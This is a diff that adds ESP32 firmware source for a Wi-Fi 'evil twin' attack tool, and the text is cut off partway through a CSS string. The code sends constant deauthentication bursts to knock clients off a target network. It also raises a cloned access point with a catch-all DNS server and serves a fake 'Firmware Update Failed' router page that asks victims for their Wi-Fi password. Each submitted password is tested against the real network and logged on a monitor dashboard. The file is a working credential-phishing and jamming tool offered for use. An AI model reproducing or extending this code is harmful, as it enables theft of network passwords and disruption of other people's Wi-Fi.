@@ -1,0 +1,7140 @@
+#include <Arduino.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <esp_wifi.h>
+#include <esp_wifi_types.h>
+#include "config.h"
+#include <Preferences.h>
+Preferences prefs;
+#include "deauth.h"
+#include <LittleFS.h>
+// ==================== CONSTANT PACKET RATE CONTROL ====================
+unsigned long last_constant_deauth = 0;
+const unsigned long CONSTANT_DEAUTH_INTERVAL = 100; // 100ms = 10 bursts per second
+const int PACKETS_PER_BURST = 5;                    // 5 packets per burst = 50 packets/sec
+const int PACKET_DELAY_MS = 10;                     // 10ms delay between packets
+// Total: 10 bursts/sec × 5 packets = 50 packets/sec CONSTANT
+
+void startDevilTwinStyleDeauthWithBackgroundScan();
+void stopDevilTwinStyleDeauthWithBackgroundScan();
+void send_constant_deauth();
+
+// ==================== NEW VARIABLES FOR DEVIL TWIN ====================
+unsigned long last_deauth_send = 0;
+const unsigned long DEAUTH_INTERVAL_MS = 100;
+const unsigned long CLIENT_CHECK_INTERVAL_MS = 2000;
+const unsigned long BACKGROUND_SCAN_INTERVAL = 60000;
+const unsigned long VERIFICATION_TIMEOUT = 30000;
+unsigned long last_client_check = 0;
+unsigned long last_scan_time = 0;
+unsigned long last_mac_cleanup = 0;
+const unsigned long MAC_CLEANUP_INTERVAL = 300000;
+#define MAX_STORED_CLIENTS 50
+std::vector<String> uniqueClientMACs;
+int total_history_clients = 0;
+int eliminated_stations = 0;
+int totalAttempts = 0;
+int wrongAttempts = 0;
+int connectedClients = 0;
+bool showingProgress = false;
+
+// Function prototypes for Devil Twin
+void send_broadcast_deauth();
+void updateClientCount();
+void performBackgroundScan();
+void logPasswordAttempt(String password, String status, String clientMac);
+void updatePasswordAttemptStatus(String password, String newStatus);
+void updateClientTracking();
+
+// Add these structures for monitoring
+struct ConnectedClient
+{
+  String mac;
+  unsigned long firstSeen;
+  unsigned long lastSeen;
+  int packetsCaptured;
+  bool everSubmittedPassword;
+};
+
+struct PasswordAttempt
+{
+  String password;
+  unsigned long timestamp;
+  String status; // "VERIFYING", "SUCCESS", "FAILURE"
+  String clientMac;
+  String clientInfo;
+};
+
+// Monitoring variables
+#define MAX_CLIENTS 20
+#define MAX_PASSWORD_ATTEMPTS 50
+
+ConnectedClient clients[MAX_CLIENTS];
+PasswordAttempt passwordAttempts[MAX_PASSWORD_ATTEMPTS];
+int clientCount = 0;
+int attemptCount = 0;
+int totalUniqueClients = 0;
+unsigned long monitorStartTime = 0;
+
+// For storing current connected clients
+String currentConnectedClients = "";
+unsigned long lastClientCheck = 0;
+
+// Network variables
+_Network _networks[MAX_NETWORKS];
+_Network _selectedNetwork;
+
+// DNS and Web Server
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+DNSServer dnsServer;
+WebServer webServer(80);
+
+// Global state variables
+String _correct = "";
+String _tryPassword = "";
+bool hotspot_active = false;
+bool deauthing_active = false;
+bool devil_twin_active = false;
+bool isVerifyingPassword = false;
+String lastAttemptedPassword = "";
+unsigned long verificationStartTime = 0;
+bool passwordFound = false;
+String foundPassword = "";
+
+uint8_t real_target_bssid[6] = {0};
+String real_target_ssid = "";
+int real_target_channel = 0;
+bool combined_attack_active = false;
+bool evil_twin_running = false;
+bool deauth_attack_active = false;
+
+// Target info for Devil Twin
+uint8_t devil_target_bssid[6] = {0};
+String devil_target_ssid = "";
+int devil_target_channel = 0;
+
+// Timing variables
+unsigned long now = 0;
+unsigned long wifinow = 0;
+unsigned long deauth_now = 0;
+int wifi_channel = 0;
+
+// Default main strings
+#define SUBTITLE "ACCESS POINT RESCUE MODE"
+#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
+#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."
+
+// Background scanning variables
+bool background_scanning_active = false;
+bool background_scan_in_progress = false;
+
+// Function prototypes
+void clearArray();
+String bytesToStr(const uint8_t *b, uint32_t size);
+String header(String t);
+String footer();
+String index();
+void performScan();
+void handleResult();
+void handleIndex();
+void handleAdmin();
+void startDevilTwin();
+void stopDevilTwin();
+void send_devil_broadcast_deauth();
+void handleHandshake();
+
+typedef struct
+{
+  uint8_t ap_record_id;
+  uint8_t type;
+  uint8_t method;
+  uint8_t timeout;
+} attack_request_t;
+
+// Function to format MAC address from uint8_t array
+String formatMAC(const uint8_t *mac)
+{
+  char macStr[18];
+  snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return String(macStr);
+}
+
+// Function to get client MAC from IP
+String getClientMac(IPAddress ip)
+{
+  wifi_sta_list_t wifi_sta_list;
+  tcpip_adapter_sta_list_t adapter_sta_list;
+
+  esp_wifi_ap_get_sta_list(&wifi_sta_list);
+  tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list);
+
+  for (int i = 0; i < adapter_sta_list.num; i++)
+  {
+    tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
+    IPAddress stationIP(station.ip.addr);
+
+    if (stationIP == ip)
+    {
+      return formatMAC(station.mac);
+    }
+  }
+  return "Unknown";
+}
+
+// Function to get all connected clients
+String getConnectedClients()
+{
+  wifi_sta_list_t wifi_sta_list;
+  esp_wifi_ap_get_sta_list(&wifi_sta_list);
+
+  String result = "";
+  for (int i = 0; i < wifi_sta_list.num; i++)
+  {
+    uint8_t *mac = wifi_sta_list.sta[i].mac;
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
+    if (i > 0)
+      result += ", ";
+    result += String(macStr);
+
+    bool found = false;
+    for (int j = 0; j < clientCount; j++)
+    {
+      if (clients[j].mac == String(macStr))
+      {
+        clients[j].lastSeen = millis();
+        found = true;
+        break;
+      }
+    }
+
+    if (!found && clientCount < MAX_CLIENTS)
+    {
+      clients[clientCount].mac = String(macStr);
+      clients[clientCount].firstSeen = millis();
+      clients[clientCount].lastSeen = millis();
+      clients[clientCount].packetsCaptured = 0;
+      clients[clientCount].everSubmittedPassword = false;
+      clientCount++;
+      totalUniqueClients = clientCount;
+    }
+  }
+
+  return (result == "") ? "None" : result;
+}
+
+// Function to log password attempt
+void logPasswordAttempt(String password, String status, String clientMac = "")
+{
+  for (int i = MAX_PASSWORD_ATTEMPTS - 1; i > 0; i--)
+  {
+    passwordAttempts[i] = passwordAttempts[i - 1];
+  }
+
+  passwordAttempts[0].password = password;
+  passwordAttempts[0].timestamp = millis();
+  passwordAttempts[0].status = status;
+  passwordAttempts[0].clientMac = clientMac;
+  passwordAttempts[0].clientInfo = "";
+
+  if (attemptCount < MAX_PASSWORD_ATTEMPTS)
+  {
+    attemptCount++;
+  }
+
+  if (clientMac != "" && clientMac != "Unknown")
+  {
+    for (int i = 0; i < clientCount; i++)
+    {
+      if (clients[i].mac == clientMac)
+      {
+        clients[i].everSubmittedPassword = true;
+        clients[i].packetsCaptured++;
+        break;
+      }
+    }
+  }
+}
+
+// Function to update password attempt status (your existing function is fine)
+void updatePasswordAttemptStatus(String password, String newStatus)
+{
+  for (int i = 0; i < attemptCount; i++)
+  {
+    if (passwordAttempts[i].password == password &&
+        passwordAttempts[i].status == "VERIFYING")
+    {
+      passwordAttempts[i].status = newStatus;
+      Serial.printf("✅ Status updated for '%s' to %s at index %d\n",
+                    password.c_str(), newStatus.c_str(), i);
+      break;
+    }
+  }
+}
+
+// Function to generate monitor page HTML
+String generateMonitorPage()
+{
+  String page = "<!DOCTYPE html><html><head>";
+  page += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  page += "<meta http-equiv='refresh' content='5'>";
+  page += "<style>";
+  page += "body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }";
+  page += ".container { max-width: 1200px; margin: 0 auto; }";
+  page += ".header { border-bottom: 2px solid #00ff00; padding: 10px; margin-bottom: 20px; }";
+  page += ".stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 20px; }";
+  page += ".stat-card { background: #1a1a1a; border: 1px solid #00ff00; padding: 15px; border-radius: 5px; }";
+  page += ".stat-value { font-size: 24px; font-weight: bold; color: #00ff00; }";
+  page += ".stat-label { font-size: 14px; color: #888; }";
+  page += ".section { background: #1a1a1a; border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; border-radius: 5px; }";
+  page += "table { width: 100%; border-collapse: collapse; }";
+  page += "th { text-align: left; padding: 8px; border-bottom: 2px solid #00ff00; color: #00ff00; }";
+  page += "td { padding: 8px; border-bottom: 1px solid #333; }";
+  page += ".success { color: #00ff00; }";
+  page += ".failure { color: #ff0000; }";
+  page += ".verifying { color: #ffff00; text-shadow: 0 0 5px #ffff00; animation: blink 1s infinite; }";
+  page += "@keyframes blink {";
+  page += "  0% { opacity: 1; }";
+  page += "  50% { opacity: 0.5; }";
+  page += "  100% { opacity: 1; }";
+  page += "}";
+  page += ".timestamp { color: #888; font-size: 12px; }";
+  page += ".client-list { max-height: 200px; overflow-y: auto; }";
+  page += ".client-item { padding: 5px; border-bottom: 1px solid #333; }";
+  page += ".client-item:hover { background: #333; }";
+  page += ".glitch { animation: glitch 1s infinite; }";
+  page += "@keyframes glitch {";
+  page += "0% { text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff; }";
+  page += "25% { text-shadow: -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #00ffff; }";
+  page += "50% { text-shadow: 0.025em 0.05em 0 #ff00ff, 0.05em 0 0 #00ffff; }";
+  page += "75% { text-shadow: -0.025em 0 0 #ff00ff, -0.025em -0.05em 0 #00ffff; }";
+  page += "100% { text-shadow: 0.025em -0.025em 0 #ff00ff, -0.025em -0.05em 0 #00ffff; }";
+  page += "}";
+  page += "</style>";
+  page += "</head><body>";
+  page += "<div class='container'>";
+
+  page += "<div class='header'>";
+  page += "<h1 class='glitch'>[ MONITOR DASHBOARD ]</h1>";
+  page += "<p>Target AP: <strong>" + _selectedNetwork.ssid + "</strong> | Channel: " + String(_selectedNetwork.ch) + "</p>";
+  page += "<p>Monitor Started: " + String((millis() - monitorStartTime) / 1000) + " seconds ago</p>";
+  page += "</div>";
+
+  page += "<div class='stats-grid'>";
+  wifi_sta_list_t wifi_sta_list;
+  esp_wifi_ap_get_sta_list(&wifi_sta_list);
+  page += "<div class='stat-card'><div class='stat-value'>" + String(wifi_sta_list.num) + "</div><div class='stat-label'>CURRENT CONNECTED</div></div>";
+  page += "<div class='stat-card'><div class='stat-value'>" + String(totalUniqueClients) + "</div><div class='stat-label'>TOTAL UNIQUE</div></div>";
+  page += "<div class='stat-card'><div class='stat-value'>" + String(attemptCount) + "</div><div class='stat-label'>PASSWORD ATTEMPTS</div></div>";
+
+  int successCount = 0;
+  for (int i = 0; i < attemptCount; i++)
+  {
+    if (passwordAttempts[i].status == "SUCCESS")
+      successCount++;
+  }
+  page += "<div class='stat-card'><div class='stat-value'>" + String(successCount) + "</div><div class='stat-label'>SUCCESSFUL</div></div>";
+  page += "</div>";
+
+  page += "<div class='section'>";
+  page += "<h3>>> CURRENTLY CONNECTED CLIENTS <<</h3>";
+  page += "<div class='client-list'>";
+  esp_wifi_ap_get_sta_list(&wifi_sta_list);
+
+  if (wifi_sta_list.num == 0)
+  {
+    page += "<div class='client-item'>[!] No clients connected</div>";
+  }
+  else
+  {
+    for (int i = 0; i < wifi_sta_list.num; i++)
+    {
+      uint8_t *mac = wifi_sta_list.sta[i].mac;
+      char macStr[18];
+      snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+               mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
+      page += "<div class='client-item'>";
+      page += "[+] " + String(macStr);
+
+      for (int j = 0; j < clientCount; j++)
+      {
+        if (clients[j].mac == String(macStr) && clients[j].everSubmittedPassword)
+        {
+          page += " <span class='success'>(PASSWORD SUBMITTED)</span>";
+          break;
+        }
+      }
+      page += "</div>";
+    }
+  }
+  page += "</div></div>";
+
+  page += "<div class='section'>";
+  page += "<h3>>> PASSWORD ATTEMPTS LOG <<</h3>";
+  page += "<table>";
+  page += "<tr><th>TIME</th><th>PASSWORD</th><th>STATUS</th><th>CLIENT MAC</th></tr>";
+
+  if (attemptCount == 0)
+  {
+    page += "<tr><td colspan='4' style='text-align: center; padding: 20px;'>[!] No password attempts yet</td></tr>";
+  }
+  else
+  {
+    for (int i = 0; i < attemptCount; i++)
+    {
+      unsigned long secondsAgo = (millis() - passwordAttempts[i].timestamp) / 1000;
+      String timeStr;
+      if (secondsAgo < 60)
+      {
+        timeStr = String(secondsAgo) + "s ago";
+      }
+      else
+      {
+        timeStr = String(secondsAgo / 60) + "m " + String(secondsAgo % 60) + "s ago";
+      }
+
+      page += "<tr>";
+      page += "<td class='timestamp'>" + timeStr + "</td>";
+      page += "<td>" + passwordAttempts[i].password + "</td>";
+
+      String statusClass = "";
+      String statusText = passwordAttempts[i].status;
+
+      if (passwordAttempts[i].status == "SUCCESS")
+      {
+        statusClass = "success";
+      }
+      else if (passwordAttempts[i].status == "FAILURE")
+      {
+        statusClass = "failure";
+      }
+      else if (passwordAttempts[i].status == "VERIFYING")
+      {
+        statusClass = "verifying";
+        statusText = "&#9203; VERIFYING...";
+      }
+
+      page += "<td class='" + statusClass + "'>" + statusText + "</td>";
+      page += "<td>" + passwordAttempts[i].clientMac + "</td>";
+      page += "</tr>";
+    }
+  }
+  page += "</table></div>";
+
+  page += "<div class='section'>";
+  page += "<h3>>> CLIENT HISTORY <<</h3>";
+  page += "<table>";
+  page += "<tr><th>MAC ADDRESS</th><th>FIRST SEEN</th><th>LAST SEEN</th><th>PACKETS</th><th>SUBMITTED</th></tr>";
+
+  if (clientCount == 0)
+  {
+    page += "<tr><td colspan='5' style='text-align: center; padding: 20px;'>[!] No client history yet</td></tr>";
+  }
+  else
+  {
+    for (int i = 0; i < clientCount; i++)
+    {
+      unsigned long firstSeenMin = (millis() - clients[i].firstSeen) / 60000;
+      unsigned long lastSeenMin = (millis() - clients[i].lastSeen) / 60000;
+
+      page += "<tr>";
+      page += "<td>" + clients[i].mac + "</td>";
+      page += "<td>" + String(firstSeenMin) + "m ago</td>";
+      page += "<td>" + String(lastSeenMin) + "m ago</td>";
+      page += "<td>" + String(clients[i].packetsCaptured) + "</td>";
+      page += "<td class='" + String(clients[i].everSubmittedPassword ? "success" : "") + "'>";
+      page += (clients[i].everSubmittedPassword ? "[YES]" : "[NO]");
+      page += "</td>";
+      page += "</tr>";
+    }
+  }
+  page += "</table></div>";
+
+  page += "<div class='section'>";
+  page += "<h3>>> ATTACK STATUS <<</h3>";
+  page += "<table>";
+  page += "<tr><td>Evil Twin:</td><td class='" + String(hotspot_active ? "success" : "failure") + "'>" + String(hotspot_active ? "[ACTIVE]" : "[INACTIVE]") + "</td></tr>";
+  page += "<tr><td>Deauth:</td><td class='" + String(deauthing_active ? "success" : "failure") + "'>" + String(deauthing_active ? "[ACTIVE]" : "[INACTIVE]") + "</td></tr>";
+  page += "<tr><td>Devil Twin:</td><td class='" + String(devil_twin_active ? "success" : "failure") + "'>" + String(devil_twin_active ? "[ACTIVE]" : "[INACTIVE]") + "</td></tr>";
+  page += "<tr><td>Background Scan:</td><td class='" + String(background_scanning_active ? "success" : "failure") + "'>" + String(background_scanning_active ? "[ACTIVE]" : "[INACTIVE]") + "</td></tr>";
+  page += "</table></div>";
+
+  page += "<div class='section' style='text-align: center;'>";
+  page += "<a href='/moniter' style='background: #1a1a1a; color: #00ff00; border: 2px solid #00ff00; padding: 10px 20px; text-decoration: none; margin: 5px; display: inline-block;'>[ REFRESH ]</a>";
+  page += "<a href='/admin' style='background: #1a1a1a; color: #00ff00; border: 2px solid #00ff00; padding: 10px 20px; text-decoration: none; margin: 5px; display: inline-block;'>[ ADMIN PANEL ]</a>";
+  page += "</div>";
+
+  page += "<div class='section' style='text-align: center; font-size: 12px; color: #666;'>";
+  page += "> SYSTEM MONITOR v1.0 | UPTIME: " + String(millis() / 1000) + "s | ";
+  page += "FREE HEAP: " + String(ESP.getFreeHeap()) + " bytes <";
+  page += "</div>";
+
+  page += "</div></body></html>";
+  return page;
+}
+
+// Handler for monitor page
+void handleMonitor()
+{
+  webServer.send(200, "text/html", generateMonitorPage());
+}
+
+void clearArray()
+{
+  for (int i = 0; i < MAX_NETWORKS; i++)
+  {
+    _Network _network;
+    _networks[i] = _network;
+  }
+}
+
+String bytesToStr(const uint8_t *b, uint32_t size)
+{
+  String str;
+  const char ZERO = '0';
+  const char DOUBLEPOINT = ':';
+  for (uint32_t i = 0; i < size; i++)
+  {
+    if (b[i] < 0x10)
+      str += ZERO;
+    str += String(b[i], HEX);
+    if (i < size - 1)
+      str += DOUBLEPOINT;
+  }
+  return str;
+}
+
+String header(String t)
+{
+  String a = String(_selectedNetwork.ssid);
+  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
+               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+               "div { padding: 0.5em; }"
+               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
+               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
+               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+               "textarea { width: 100%; }";
+  String h = "<!DOCTYPE html><html>"
+             "<head><title>" +
+             a + " :: " + t + "</title>"
+                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+                              "<style>" +
+             CSS + "</style>"
+                   "<meta charset=\"UTF-8\"></head>"
+                   "<body><nav><b>" +
+             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+  return h;
+}
+
+String footer()
+{
+  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+}
+
+String index()
+{
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post onsubmit='return validateForm()'><label>WiFi password:</label>" +
+         "<input type=password id='password' name='password' minlength='8' oninput='checkLength()' required></input>" +
+         "<input type=submit id='submitBtn' value=Continue></form>" +
+         "<script>" +
+         "function checkLength() {" +
+         "  var pwd = document.getElementById('password');" +
+         "  var btn = document.getElementById('submitBtn');" +
+         "  if(pwd.value.length >= 8) {" +
+         "    btn.disabled = false;" +
+         "  } else {" +
+         "    btn.disabled = true;" +
+         "  }" +
+         "}" +
+         "function validateForm() {" +
+         "  var btn = document.getElementById('submitBtn');" +
+         "  if(btn.disabled) return false;" +
+         "  btn.disabled = true;" +
+         "  btn.value = 'VERIFYING...';" +
+         "  return true;" +
+         "}" +
+         "window.onload = function() { checkLength(); };" +
+         "</script>" +
+         footer();
+}
+
+void performScan()
+{
+  int n = WiFi.scanNetworks();
+  clearArray();
+  if (n >= 0)
+  {
+    for (int i = 0; i < n && i < MAX_NETWORKS; ++i)
+    {
+      _Network network;
+      network.ssid = WiFi.SSID(i);
+      for (int j = 0; j < 6; j++)
+      {
+        network.bssid[j] = WiFi.BSSID(i)[j];
+      }
+      network.ch = WiFi.channel(i);
+      network.rssi = WiFi.RSSI(i);
+      network.auth_mode = WiFi.encryptionType(i);
+      _networks[i] = network;
+    }
+  }
+}
+
+void handleResult()
+{
+  // Agar verifying mode mein hai to status check karo
+  if (isVerifyingPassword)
+  {
+    bool connectionSuccessful = (WiFi.status() == WL_CONNECTED);
+    unsigned long verificationTime = millis() - verificationStartTime;
+
+    // Get client MAC if available
+    String clientMac = getClientMac(webServer.client().remoteIP());
+
+    // ✅ CONNECTED - CORRECT PASSWORD (IMMEDIATE DETECTION)
+    if (connectionSuccessful)
+    {
+      Serial.println("✅ PASSWORD CORRECT! Connection successful!");
+      isVerifyingPassword = false;
+      _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
+      foundPassword = _tryPassword;
+      passwordFound = true;
+
+      // Update password attempt status to SUCCESS
+      updatePasswordAttemptStatus(_tryPassword, "SUCCESS");
+
+      // Stop Devil Twin if active
+      if (devil_twin_active)
+      {
+        stopDevilTwin();
+      }
+
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP("VENOME v1", "Venome@kali");
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+      Serial.println("Good password was entered !");
+      Serial.println(_correct);
+
+      webServer.send(200, "text/html", "<html><body style='background: white; color: black; font-family: Arial, sans-serif; text-align: center; padding: 50px;'><center><h2 style='color: #4CAF50;'>✅ Password Correct!</h2><p style='color: #333;'>Please wait while we verify...</p><meta http-equiv='refresh' content='2;url=/'></center></body></html>");
+      return;
+    }
+
+    // ❌ TIMEOUT - Wrong password (using VERIFICATION_TIMEOUT constant)
+    if (verificationTime >= VERIFICATION_TIMEOUT) // Using the constant (20000ms = 20 seconds)
+    {
+      Serial.println("❌ WRONG PASSWORD - Timeout reached");
+
+      // CRITICAL: Disconnect from the target AP but KEEP our AP running
+      WiFi.disconnect(false); // safer
+      WiFi.mode(WIFI_AP_STA); // ensure AP alive
+
+      // Small delay to let WiFi settle
+      delay(100);
+
+      // Make sure our AP is still running
+      WiFi.mode(WIFI_AP_STA);
+
+      // Update password attempt status to FAILURE
+      updatePasswordAttemptStatus(_tryPassword, "FAILURE");
+
+      // Log the failure
+      Serial.printf("Password '%s' marked as FAILURE\n", _tryPassword.c_str());
+
+      isVerifyingPassword = false;
+      wrongAttempts++;
+      totalAttempts++;
+
+      // Restart background scanning and deauth if in Devil Twin mode
+      if (devil_twin_active)
+      {
+        background_scanning_active = true;
+        last_scan_time = millis();
+
+        if (!deauthing_active)
+        {
+          deauthing_active = true;
+          attack_active = true;
+        }
+      }
+
+      // Send styled error message with proper redirect - WHITE BACKGROUND
+      String html = "<!DOCTYPE html><html><head>";
+      html += "<meta http-equiv='refresh' content='3;url=/'>";
+      html += "<style>";
+      html += "body { background: white; color: #333; font-family: Arial, sans-serif; text-align: center; padding: 50px; }";
+      html += ".error { color: #f44336; font-size: 2em; margin: 20px; }";
+      html += ".message { color: #ff00ff; margin: 20px; }";
+      html += "</style>";
+      html += "</head><body>";
+      html += "<div class='error'>❌ WRONG PASSWORD</div>";
+      html += "<div class='message'>Please try again</div>";
+      html += "<div>Redirecting to login page...</div>";
+      html += "</body></html>";
+
+      webServer.send(200, "text/html", html);
+      Serial.println("Wrong password tried - marked as FAILURE");
+      return;
+    }
+
+    // Still verifying - WHITE BACKGROUND with BLACK text
+    Serial.printf("Still verifying... Time: %lu/%lu\n", verificationTime / 1000, VERIFICATION_TIMEOUT / 1000);
+    String html = "<!DOCTYPE html><html><head>"
+                  "<meta http-equiv='refresh' content='2;url=/result'>"
+                  "<style>"
+                  "body { background: white; color: black; font-family: Arial, sans-serif; text-align: center; padding: 50px; }"
+                  ".verifying { color: black; font-size: 2em; margin: 20px; }"
+                  "progress { width: 80%; height: 30px; }"
+                  "</style>"
+                  "</head><body>"
+                  "<h2 class='verifying'>&#8987; STILL VERIFYING...</h2>" // ⏳ = &#8987;
+                  "<progress value='" +
+                  String(verificationTime / (VERIFICATION_TIMEOUT / 100)) + "' max='100'>" +
+                  String(verificationTime / (VERIFICATION_TIMEOUT / 100)) + "%</progress>"
+                                                                            "<p>Time: " +
+                  String(verificationTime / 1000) + "s / " + String(VERIFICATION_TIMEOUT / 1000) + "s</p>"
+                                                                                                   "</body></html>";
+    webServer.send(200, "text/html", html);
+    return;
+  }
+
+  // Agar verify nahi kar rahe to home page par redirect
+  webServer.sendHeader("Location", "/");
+  webServer.send(303);
+}
+
+String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                   "<meta charset='UTF-8'>"
+                   "<style>"
+                   "@font-face {"
+                   "  font-family: 'Orbitron';"
+                   "  font-style: normal;"
+                   "  font-weight: 400;"
+                   "  src: url('/fonts/Orbitron-Regular.ttf') format('truetype');"
+                   "}"
+                   "@font-face {"
+                   "  font-family: 'Orbitron';"
+                   "  font-style: normal;"
+                   "  font-weight: 600;"
+                   "  src: url('/fonts/Orbitron-SemiBold.ttf') format('truetype');"
+                   "}"
+                   "@font-face {"
+                   "  font-family: 'Orbitron';"
+                   "  font-style: normal;"
+                   "  font-weight: 800;"
+                   "  src: url('/fonts/Orbitron-ExtraBold.ttf') format('truetype');"
+                   "}"
+                   "* {"
+                   "  margin: 0;"
+                   "  padding: 0;"
+                   "  box-sizing: border-box;"
+                   "}"
+                   "body {"
+                   "  background: #0a0f1f;"
+                   "  color: #fff;"
+                   "  font-family: 'Orbitron', sans-serif;"
+                   "  min-height: 100vh;"
+                   "  padding: 20px;"
+                   "  position: relative;"
+                   "  overflow-x: hidden;"
+                   "}"
+                   "body::before {"
+                   "  content: '';"
+                   "  position: fixed;"
+                   "  top: 0;"
+                   "  left: 0;"
+                   "  width: 100%;"
+                   "  height: 100%;"
+                   "  background: radial-gradient(circle at 20% 50%, rgba(255, 0, 255, 0.1) 0%, transparent 50%),"
+                   "              radial-gradient(circle at 80% 80%, rgba(0, 255, 255, 0.1) 0%, transparent 50%);"
+                   "  pointer-events: none;"
+                   "  z-index: -1;"
+                   "}"
+                   ".cyber-container {"
+                   "  max-width: 1400px;"
+                   "  margin: 0 auto;"
+                   "  position: relative;"
+                   "}"
+                   ".neon-header {"
+                   "  background: rgba(10, 15, 31, 0.9);"
+                   "  border: 2px solid #ff00ff;"
+                   "  box-shadow: 0 0 20px #ff00ff, inset 0 0 20px rgba(255, 0, 255, 0.3);"
+                   "  padding: 25px;"
+                   "  margin-bottom: 25px;"
+                   "  position: relative;"
+                   "  overflow: hidden;"
+                   "}"
+                   ".neon-header::before {"
+                   "  content: '';"
+                   "  position: absolute;"
+                   "  top: -50%;"
+                   "  left: -50%;"
+                   "  width: 200%;"
+                   "  height: 200%;"
+                   "  background: linear-gradient(45deg, transparent 30%, rgba(255, 0, 255, 0.1) 50%, transparent 70%);"
+                   "  animation: cyberGlow 6s linear infinite;"
+                   "}"
+                   "@keyframes cyberGlow {"
+                   "  0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }"
+                   "  100% { transform: translateX(100%) translateY(100%) rotate(45deg); }"
+                   "}"
+                   ".glitch-text {"
+                   "  font-size: 2.5em;"
+                   "  font-weight: 800;"
+                   "  text-transform: uppercase;"
+                   "  position: relative;"
+                   "  text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff;"
+                   "  animation: glitch 3s infinite;"
+                   "}"
+                   "@keyframes glitch {"
+                   "  0%, 100% { text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff; }"
+                   "  25% { text-shadow: -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #00ffff; }"
+                   "  50% { text-shadow: 0.025em 0.05em 0 #ff00ff, 0.05em 0 0 #00ffff; }"
+                   "  75% { text-shadow: -0.025em 0 0 #ff00ff, -0.025em -0.05em 0 #00ffff; }"
+                   "}"
+                   ".subtitle {"
+                   "  color: #00ffff;"
+                   "  text-shadow: 0 0 10px #00ffff;"
+                   "  letter-spacing: 3px;"
+                   "  margin-top: 10px;"
+                   "}"
+                   ".cyber-card {"
+                   "  background: rgba(10, 15, 31, 0.9);"
+                   "  border: 2px solid #00ffff;"
+                   "  box-shadow: 0 0 20px #00ffff, inset 0 0 20px rgba(0, 255, 255, 0.2);"
+                   "  padding: 25px;"
+                   "  margin-bottom: 25px;"
+                   "  display: flex;"
+                   "  flex-wrap: wrap;"
+                   "  gap: 30px;"
+                   "  position: relative;"
+                   "  backdrop-filter: blur(5px);"
+                   "}"
+                   ".target-badge {"
+                   "  position: absolute;"
+                   "  top: -12px;"
+                   "  left: 20px;"
+                   "  background: #0a0f1f;"
+                   "  padding: 0 15px;"
+                   "  color: #ff00ff;"
+                   "  border: 1px solid #ff00ff;"
+                   "  box-shadow: 0 0 10px #ff00ff;"
+                   "  font-size: 0.9em;"
+                   "  letter-spacing: 2px;"
+                   "}"
+                   ".cyber-info {"
+                   "  flex: 1;"
+                   "}"
+                   ".cyber-label {"
+                   "  color: #00ffff;"
+                   "  font-size: 0.8em;"
+                   "  text-transform: uppercase;"
+                   "  letter-spacing: 2px;"
+                   "  margin-bottom: 5px;"
+                   "  opacity: 0.8;"
+                   "}"
+                   ".cyber-value {"
+                   "  font-size: 1.8em;"
+                   "  font-weight: 600;"
+                   "  color: #fff;"
+                   "  text-shadow: 0 0 10px #ff00ff;"
+                   "  margin-bottom: 10px;"
+                   "}"
+                   ".cyber-mac {"
+                   "  color: #888;"
+                   "  font-family: monospace;"
+                   "  letter-spacing: 1px;"
+                   "}"
+                   ".neon-progress {"
+                   "  min-width: 250px;"
+                   "}"
+                   ".progress-header {"
+                   "  display: flex;"
+                   "  justify-content: space-between;"
+                   "  margin-bottom: 10px;"
+                   "  color: #00ffff;"
+                   "}"
+                   ".neon-bar {"
+                   "  height: 12px;"
+                   "  background: #1a1f2f;"
+                   "  border: 1px solid #ff00ff;"
+                   "  box-shadow: 0 0 10px #ff00ff;"
+                   "  position: relative;"
+                   "  overflow: hidden;"
+                   "}"
+                   ".neon-fill {"
+                   "  height: 100%;"
